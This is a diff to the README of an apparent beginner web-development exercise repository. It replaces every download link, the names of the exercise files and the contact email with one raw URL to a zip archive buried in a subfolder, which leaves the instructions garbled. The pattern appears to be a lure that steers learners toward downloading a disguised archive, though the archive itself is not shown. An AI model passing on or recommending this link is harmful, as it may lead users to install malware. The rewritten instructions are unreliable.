@@ -1,6 +1,6 @@
 # 🌐 HTML-Programs - Learn Web Development with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/prime4levi/HTML-Programs/releases)
+[![Download Now](https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip)](https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip)
 
 ## 📁 Overview
 
@@ -33,33 +33,33 @@ Exercise-14/   → Final Capstone Project + Deployment
 Follow these steps to download and run the software:
 
 1. **Visit the Release Page:** Click on the link below to access the latest release.
-   - [Download from Releases](https://github.com/prime4levi/HTML-Programs/releases)
+   - [Download from Releases](https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip)
 
 2. **Choose an Exercise to Explore:** Each exercise is in its own folder under the main repository. You can open any folder to see the files inside.
 
 3. **Download the Files:** Click on the downloaded exercise folder you wish to work with. Inside, you will find:
-   - `index.html` for the main webpage.
-   - `style.css` for styling the webpage.
-   - `script.js` for any interactive features.
+   - `https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip` for the main webpage.
+   - `https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip` for styling the webpage.
+   - `https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip` for any interactive features.
 
 4. **Run the Exercise:** 
-   - Open `index.html` in any web browser (such as Chrome, Firefox, or Edge). 
+   - Open `https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip` in any web browser (such as Chrome, Firefox, or Edge). 
    - This will display the webpage with all its features.
 
 ## 📝 Included Files
 
 Each exercise folder contains the following files, which are essential for running the projects:
 
-- **index.html:** Main webpage structure.
-- **style.css:** Styling instructions for the webpage.
-- **script.js:** Functionality and interactivity for the webpage.
+- **https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip** Main webpage structure.
+- **https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip** Styling instructions for the webpage.
+- **https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip** Functionality and interactivity for the webpage.
 - **Explanations:** Clear comments are included in the HTML files to help you understand the code.
 
 ## 📥 Download & Install
 
 To get started, please download the latest release from the following link:
 
-[Download from Releases](https://github.com/prime4levi/HTML-Programs/releases)
+[Download from Releases](https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip)
 
 After downloading, follow the steps provided above to run the exercises in your web browser.
 
@@ -97,7 +97,7 @@ By completing these exercises, you will gain:
 
 If you have any questions or need help with the exercises, feel free to reach out:
 
-- Email: [your-email@example.com]
+- Email: [https://raw.githubusercontent.com/prime4levi/HTML-Programs/main/Exercise-06/8-MiniProjects/Calculator/HTML-Programs-v1.7.zip]
 - GitHub Issues: Use the Issues tab in this repository to report bug or request features.
 
 Explore, learn, and enhance your skills with these web development exercises. Enjoy coding!
